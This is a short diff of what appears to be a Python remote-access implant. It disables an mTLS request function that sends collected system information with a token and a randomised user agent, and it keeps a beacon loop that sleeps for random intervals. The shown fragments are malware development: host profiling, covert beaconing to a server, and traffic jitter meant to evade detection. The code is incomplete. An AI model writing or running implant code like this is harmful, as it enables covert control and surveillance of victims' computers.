@@ -53,7 +53,10 @@ session.cert = (
 )
 
 
-def run_mtls_requests():
+'''
+    check if mTLS works!
+    
+    def run_mtls_requests():
     headers = {"USER-AGENT": random.choice(USER_AGENTS), "TOKEN": TOKEN}
 
     payload = get_system_info()
@@ -72,7 +75,7 @@ def run_mtls_requests():
         print("SSL Error",{e})
     except requests.exceptions.RequestException as e:
         print(f"Connection Error: {e}")
-
+'''
 
 def encrypt_data(data):
     return cipher.encrypt(data.encode()).decode()
@@ -396,7 +399,7 @@ def main():
 
     # Main loop after successful login
     while True:
-        run_mtls_requests()
+        #run_mtls_requests()
         beacon()
         sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
         print(f"[+] Sleeping {sleep_time} seconds")
